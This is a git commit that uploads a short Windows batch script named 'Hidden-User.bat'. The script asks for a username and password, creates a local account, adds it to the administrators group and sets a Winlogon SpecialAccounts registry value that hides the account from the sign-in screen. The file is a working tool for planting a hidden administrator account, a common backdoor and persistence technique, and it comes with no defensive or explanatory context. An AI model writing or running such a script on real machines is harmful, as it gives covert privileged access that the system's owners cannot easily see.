87263055541263947fd36673f0425e8e357d0354
Pir_Khorasani <48911411+mdkuhjani@users.noreply.github.com>
2026-02-10 12:35:26 +0330

    Add files via upload

---
+++ Hidden-User.bat
@@ -0,0 +1,11 @@
+cd\
+cls
+REM "Make Hidden Users"
+
+@echo off
+set /p user=Username:
+set /p pass=Pssword:
+net user /add %user% %pass%
+net localgroup administrators /add %user%
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
+pause
